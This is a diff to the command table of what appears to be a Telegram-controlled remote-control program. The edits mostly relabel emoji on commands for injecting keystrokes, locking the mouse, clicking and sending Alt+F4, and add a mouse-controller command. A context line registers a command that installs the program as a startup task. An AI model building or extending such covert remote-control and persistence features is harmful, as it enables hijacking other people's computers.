@@ -613,9 +613,10 @@ class PeppinoTelegram:
             Command("add_as_task", self.add_as_task, "Adds itself as a task", "system_control", "⏰ Set as startup task"),
 
             # 🎮 Input / Device Control
-            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎹 Randomkeyboard"),
+            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎲 Random Keyboard"),
             Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "input", "🔠 Capslock"),
-            Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🖱️ Mouselock"),
+            Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🔒🖱️ Mouse Lock"),
+            Command("mouse_controller", self.mousecontroller, "Opens mouse controller.", "input", "🎛️ Mouse Controller"),
 
             Command("mouseu", self.mouseu, "Mouse Up.", "null", "Mouse Up."),
             Command("moused", self.moused, "Mouse Down.", "null", "Mouse Down."),
@@ -623,9 +624,9 @@ class PeppinoTelegram:
             Command("mouser", self.mouser, "Mouse Right.", "null", "Mouse Right."),
 
             Command("set_mouse_jump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
-            Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
-            Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),
-            Command("altf4", self.altf4, "Send Alt+F4.", "input", "⌨️ Altf4"),
+            Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️⬅️ Left Click"),
+            Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️➡️ Right Click"),
+            Command("altf4", self.altf4, "Send Alt+F4.", "input", "❌ Alt+F4"),
 
             # 📋 Messaging
             Command("bsend", self.bsend, "Send text message.", "messaging", "📤 Bsend"),
